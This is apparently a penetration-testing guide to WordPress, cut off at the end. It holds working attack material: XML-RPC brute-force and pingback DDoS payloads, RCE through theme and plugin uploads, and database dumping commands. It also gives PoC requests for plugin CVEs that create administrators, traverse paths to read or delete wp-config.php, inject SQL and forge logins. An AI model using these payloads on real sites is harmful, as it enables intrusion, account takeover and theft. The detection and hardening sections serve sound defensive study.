# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Arquivos Principais do WordPress**

- `index.php`
- `license.txt` contém informações úteis, como a versão do WordPress instalada.
- `wp-activate.php` é usado para o processo de ativação por email ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocultá-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` é um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos com HTTP atuando como mecanismo de transporte e XML como mecanismo de codificação. Esse tipo de comunicação foi substituído pela WordPress REST API.
- A pasta `wp-content` é o diretório principal onde plugins e temas são armazenados.
- `wp-content/uploads/` é o diretório onde quaisquer arquivos enviados para a plataforma são armazenados.
- `wp-includes/` é o diretório onde os arquivos core são armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em versões do WordPress 5.5 e superiores, o WordPress gera um arquivo sitemap XML com todos os posts públicos e tipos de post e taxonomias publicamente consultáveis.

**Pós-exploração**

- O arquivo `wp-config.php` contém informações necessárias para o WordPress conectar-se ao banco de dados, como o nome do banco de dados, host do banco, nome de usuário e senha, chaves de autenticação e salts, e o prefixo das tabelas do banco. Esse arquivo de configuração também pode ser usado para ativar o modo DEBUG, que pode ser útil na solução de problemas.

### Permissões de Usuários

- **Administrador**
- **Editor**: Publica e gerencia suas e outras publicações
- **Autor**: Publica e gerencia suas próprias publicações
- **Colaborador**: Escreve e gerencia suas publicações, mas não pode publicá-las
- **Assinante**: Navega pelas publicações e edita seu perfil

## **Enumeração Passiva**

### **Obter versão do WordPress**

Verifique se você consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **código-fonte** da página (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos CSS vinculados

![](<../../images/image (533).png>)

- Arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair versões em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeração ativa

### Plugins and Themes

Você provavelmente não conseguirá encontrar todos os Plugins and Themes possíveis. Para descobrir todos eles, você precisará **ativamente Brute Force uma lista de Plugins and Themes** (espero que existam ferramentas automatizadas que contenham essas listas).

### Usuários

- **ID Brute:** Você obtém usuários válidos de um site WordPress por Brute Forcing os IDs de usuários:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id é **válido**. Se a resposta for **400**, então o id é **inválido**.

- **wp-json:** Você também pode tentar obter informações sobre os usuários consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar algumas informações sobre usuários é:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Observe que este endpoint expõe apenas usuários que fizeram uma publicação. **Somente informações sobre os usuários que tiverem esse recurso ativado serão fornecidas**.

Além disso, observe que **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`** a **mensagem** é **diferente** ao indicar se o **username** existe ou não.

### XML-RPC

Se `xml-rpc.php` estiver ativo você pode realizar um credentials brute-force ou usá-lo para lançar ataques DoS a outros recursos. (Você pode automatizar esse processo [usando isto](https://github.com/relarizky/wpxploit), por exemplo).

Para verificar se está ativo, tente acessar _**/xmlrpc.php**_ e envie esta requisição:

**Verifique**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** são alguns dos métodos que podem ser usados para brute-force credentials. Se você conseguir encontrar qualquer um deles, você pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ dentro de uma resposta com código 200 deve aparecer se as credenciais não forem válidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credenciais corretas você pode fazer upload de um arquivo. Na resposta o caminho aparecerá ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Também existe uma maneira **mais rápida** de brute-force credenciais usando **`system.multicall`** já que você pode testar várias credenciais na mesma requisição:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Contornar 2FA**

Esse método foi pensado para programas e não para humanos, e é antigo; portanto não suporta 2FA. Então, se você tem credenciais válidas mas a entrada principal está protegida por 2FA, **você pode ser capaz de abusar de xmlrpc.php para fazer login com essas credenciais contornando a 2FA**. Observe que você não poderá executar todas as ações que pode fazer através do console, mas ainda assim pode chegar a RCE como Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou port scanning**

Se você encontrar o método _**pingback.ping**_ dentro da lista, você pode fazer o Wordpress enviar uma requisição arbitrária para qualquer host/porta.\
Isso pode ser usado para solicitar que **milhares** de **sites** Wordpress **acessem** um único **local** (causando assim um **DDoS** naquele local) ou você pode usá-lo para fazer o **Wordpress** realizar um **scan** de alguma **rede** interna (você pode indicar qualquer porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se você obtiver **faultCode** com um valor **maior** do que **0** (17), isso significa que a porta está aberta.

Veja o uso de **`system.multicall`** na seção anterior para aprender como abusar desse método para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo normalmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando este arquivo é **acessado**, uma consulta MySQL "**heavy**" é executada, então ele pode ser usado por **attackers** para **causar** um **DoS**.\
Além disso, por padrão, o `wp-cron.php` é chamado a cada carregamento de página (sempre que um cliente solicita qualquer página do Wordpress), o que em sites de alto tráfego pode causar problemas (DoS).

Recomenda-se desativar o Wp-Cron e criar um cronjob real no host que execute as ações necessárias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site Wordpress pode fazer uma requisição para você.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se existe o **methodName: pingback.ping** e o caminho **/wp-json/oembed/1.0/proxy**, e se existirem, tenta explorá-los.

## Ferramentas Automáticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais do que um ataque real, isto é uma curiosidade. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) você poderia inverter 1 bit de qualquer arquivo wordpress. Assim, você poderia inverter a posição `5389` do arquivo `/var/www/html/wp-includes/user.php` para NOP a operação NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema usado (credenciais admin necessárias)**

Aparência → Editor de Temas → Template 404 (à direita)

Substitua o conteúdo por um php shell:

![](<../../images/image (384).png>)

Pesquise na internet como acessar essa página atualizada. Nesse caso você deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Você pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sessão.

## Plugin RCE

### PHP plugin

Pode ser possível fazer upload de arquivos .php como um plugin.\
Crie seu backdoor php usando, por exemplo:

![](<../../images/image (183).png>)

Depois adicione um novo plugin:

![](<../../images/image (722).png>)

Faça upload do plugin e pressione Install Now:

![](<../../images/image (249).png>)

Clique em Procced:

![](<../../images/image (70).png>)

Provavelmente isso aparentemente não fará nada, mas se você for em Media, verá seu shell enviado:

![](<../../images/image (462).png>)

Acesse-o e você verá a URL para executar o reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Este método envolve a instalação de um plugin malicioso conhecido por ser vulnerável e que pode ser explorado para obter um web shell. Esse processo é realizado através do WordPress dashboard da seguinte forma:

1. **Aquisição do plugin**: O plugin é obtido de uma fonte como Exploit DB, por exemplo [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalação do plugin**:
- Navegue até o WordPress dashboard, então vá para `Dashboard > Plugins > Upload Plugin`.
- Faça o upload do arquivo zip do plugin baixado.
3. **Ativação do plugin**: Depois que o plugin for instalado com sucesso, ele deve ser ativado através do dashboard.
4. **Exploitation**:
- Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado pois é conhecido por ser vulnerável.
- O Metasploit framework fornece um exploit para essa vulnerabilidade. Ao carregar o módulo apropriado e executar comandos específicos, uma sessão meterpreter pode ser estabelecida, concedendo acesso não autorizado ao site.
- Observa-se que este é apenas um dos muitos métodos para explorar um site WordPress.

O conteúdo inclui auxílios visuais mostrando os passos no WordPress dashboard para instalar e ativar o plugin. Contudo, é importante notar que explorar vulnerabilidades dessa maneira é ilegal e antiético sem autorização adequada. Essas informações devem ser usadas de forma responsável e somente em um contexto legal, como pentesting com permissão explícita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS para RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ é um script projetado para escalar uma vulnerabilidade de **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades críticas no WordPress. Para mais informações veja [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele oferece suporte para as versões do WordPress 6.X.X, 5.X.X e 4.X.X e permite:
- _**Privilege Escalation:**_ Cria um usuário no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faz upload do seu plugin customizado (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita um Built-In Plugin no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita um Built-In Theme no WordPress.
- _**(Custom) Custom Exploits:**_ Exploits customizados para plugins/temas WordPress de terceiros.

## Pós-exploração

Extraia nomes de usuário e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar senha do admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superfície de Ataque

Saber como um plugin do Wordpress pode expor funcionalidades é fundamental para encontrar vulnerabilidades em seu funcionamento. Você pode descobrir como um plugin pode expor funcionalidades nos itens a seguir e alguns exemplos de plugins vulneráveis em [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das maneiras que um plugin pode expor funções para usuários é via AJAX handlers. Eles podem conter logic, authorization, ou authentication bugs. Além disso, é bastante frequente que essas funções baseiem tanto a authentication quanto a authorization na existência de um wordpress nonce que **any user authenticated in the Wordpress instance might have** (independentemente do seu papel).

Estas são as funções que podem ser usadas para expor uma função em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acessível por qualquer usuário (mesmo não autenticados).**

> [!CAUTION]
> Além disso, se a função apenas verifica a autorização do usuário com a função `wp_verify_nonce`, essa função apenas verifica que o usuário está logado, geralmente não verifica o papel (role) do usuário. Então usuários com poucos privilégios podem ter acesso a ações de alto privilégio.

- **REST API**

Também é possível expor funções do wordpress registrando uma REST API usando a função `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` é um callback para uma função que verifica se um dado usuário está autorizado a chamar o método da API.

**Se a função interna `__return_true` for usada, ela simplesmente vai pular a verificação de permissões do usuário.**

- **Direct access to the php file**

Claro, Wordpress usa PHP e arquivos dentro de plugins são diretamente acessíveis pela web. Portanto, caso um plugin exponha qualquer funcionalidade vulnerável que seja acionada apenas ao acessar o arquivo, ela poderá ser explorada por qualquer usuário.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Alguns plugins implementam atalhos de “trusted header” para integrações internas ou reverse proxies e então usam esse header para definir o contexto do usuário atual para requisições REST. Se o header não for vinculado criptograficamente à requisição por um componente upstream, um atacante pode falsificá-lo e acessar rotas REST privilegiadas como administrador.

- Impacto: escalada de privilégio não autenticada para admin ao criar um novo administrador via a core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (força o ID do usuário 1, tipicamente a primeira conta de administrador).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um cabeçalho controlado pelo cliente para o estado de autenticação e pula as verificações de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin a contorna definindo diretamente o contexto do usuário atual a partir do cabeçalho.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usuário criado.
- Um novo usuário admin visível em `wp-admin/users.php`.

Checklist de detecção

- Procure por `getallheaders()`, `$_SERVER['HTTP_...']`, ou vendor SDKs que leem cabeçalhos customizados para definir o contexto do usuário (ex.: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revise registros REST em busca de callbacks privilegiados que não tenham checagens robustas de `permission_callback` e que, em vez disso, dependam de cabeçalhos da requisição.
- Procure usos de funções core de gerenciamento de usuários (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que sejam protegidos apenas por valores de cabeçalho.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **verificação de capability** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Sanitização / validação estrita da entrada**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este snippet:

* **Unauthenticated access** – o hook `wp_ajax_nopriv_` está registrado.
* **Sem nonce / capability check** – qualquer visitante pode acessar o endpoint.
* **Sem sanitização do caminho** – a string controlada pelo usuário `fontfamily` é concatenada a um caminho do sistema de arquivos sem filtragem, permitindo o clássico `../../` traversal.

#### Exploitation

Um atacante pode excluir qualquer arquivo ou diretório **abaixo do diretório base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma única requisição HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Outros alvos impactantes incluem arquivos `.php` de plugin/theme (para comprometer plugins de segurança) ou regras `.htaccess`.

#### Checklist de detecção

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que chame helpers do sistema de arquivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenação de entrada do usuário não sanitizada em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Ausência de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why it’s exploitable

- Confia em `$_REQUEST['reset-for']` e em uma opção do plugin sem autorização no lado do servidor.
- Se um usuário anteriormente tinha privilégios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaurá-los acessando o caminho de reset.
- Em algumas implantações, qualquer usuário autenticado poderia disparar um reset para outro nome de usuário ainda presente em `viewing_admin_as_role_are` (autorização quebrada).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em builds vulneráveis isso remove as roles atuais e readiciona as roles originais salvas (por exemplo, `administrator`), efetivamente escalando privilégios.

Detection checklist

- Procure por funcionalidades de troca de role que persistem as “original roles” em user meta (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique caminhos de reset/restore que:
- Leem usernames de `$_REQUEST` / `$_GET` / `$_POST`.
- Modificam roles via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizam com base em um array de opção do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Alguns plugins conectam helpers de troca de usuário ao hook público `init` e derivam a identidade a partir de um cookie controlado pelo cliente. Se o código chama `wp_set_auth_cookie()` sem verificar autenticação, capability e um nonce válido, qualquer visitante não autenticado pode forçar o login como um ID de usuário arbitrário.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por que é explorável

- O hook público `init` torna o handler acessível por usuários não autenticados (sem verificação `is_user_logged_in()`).
- A identidade é derivada de um cookie modificável pelo cliente (`original_user_id`).
- A chamada direta a `wp_set_auth_cookie($uid)` autentica o solicitante como esse usuário sem quaisquer verificações de capability/nonce.

Exploração (sem autenticação)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

WAFs genéricos de edge/servidor são calibrados para padrões amplos (SQLi, XSS, LFI). Muitas falhas de alto impacto em WordPress/plugins são bugs de lógica/auth específicos da aplicação que parecem tráfego benigno, a menos que o engine entenda as rotas do WordPress e a semântica do plugin.

Offensive notes

- Alveje endpoints específicos do plugin com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Teste caminhos não autenticados primeiro (AJAX `nopriv`, REST com permissive `permission_callback`, shortcodes públicos). Payloads padrão frequentemente têm sucesso sem obfuscação.
- Casos típicos de alto impacto: escalonamento de privilégios (controle de acesso quebrado), upload/download arbitrário de arquivos, LFI, open redirect.

Defensive notes

- Não confie em assinaturas genéricas de WAF para proteger CVEs de plugins. Implemente patches virtuais específicos de vulnerabilidade na camada de aplicação ou atualize rapidamente.
- Prefira verificações de segurança do tipo positive-security no código (capabilities, nonces, validação estrita de entrada) em vez de filtros negativos por regex.

## Proteção do WordPress

### Atualizações regulares

Certifique-se de que WordPress, plugins, e themes estejam atualizados. Também confirme que a atualização automática está habilitada em wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Além disso, **instale apenas plugins e temas confiáveis do WordPress**.

### Plugins de Segurança

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomendações**

- Remova o usuário padrão **admin**
- Use **senhas fortes** e **2FA**
- Periodicamente **revisar** as **permissões** dos usuários
- **Limitar tentativas de login** para prevenir ataques Brute Force
- Renomeie o arquivo **`wp-admin.php`** e permita acesso somente internamente ou de certos endereços IP.

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

O plugin WP Job Portal de recrutamento expôs uma tarefa **savecategory** que, em última instância, executa o seguinte código vulnerável dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introduzidos por este trecho:

1. **Entrada de usuário não sanitizada** – `parentid` vem diretamente da requisição HTTP.
2. **Concatenação de strings dentro da cláusula WHERE** – sem `is_numeric()` / `esc_sql()` / prepared statement.
3. **Alcance sem autenticação** – embora a ação seja executada através de `admin-post.php`, a única verificação presente é um **CSRF nonce** (`wp_verify_nonce()`), que qualquer visitante pode recuperar de uma página pública que embede o shortcode `[wpjobportal_my_resumes]`.

#### Exploração

1. Obtenha um nonce válido:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitrário abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da consulta injetada ou altera o banco de dados, provando SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia que visitantes baixassem **qualquer arquivo no disco** via path traversal. O sink vulnerável está localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` é controlado pelo atacante e concatenado **sem sanitização**.  Novamente, a única barreira é um **CSRF nonce** que pode ser obtido na página do currículo.

#### Exploração
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conteúdo de `wp-config.php`, leaking DB credentials and auth keys.

## Tomada de conta não autenticada via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Many themes/plugins ship "social login" helpers exposed via admin-ajax.php. If an unauthenticated AJAX action (wp_ajax_nopriv_...) trusts client-supplied identifiers when provider data is missing and then calls wp_set_auth_cookie(), this becomes a full authentication bypass.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Por que é explorável

- Acessível sem autenticação via admin-ajax.php (ação wp_ajax_nopriv_…).
- Não há verificações de nonce/capability antes de mudança de estado.
- Falta verificação do provedor OAuth/OpenID; o default branch aceita entrada do atacante.
- get_user_by('email', $_POST['id']) seguido de wp_set_auth_cookie($uid) autentica o solicitante como qualquer endereço de email existente.

Exploitation (unauthenticated)

- Pré-requisitos: o atacante consegue acessar /wp-admin/admin-ajax.php e sabe/adivinha um email de usuário válido.
- Defina o provedor como um valor não suportado (ou omita) para atingir o default branch e passar id=<victim_email>.
```http
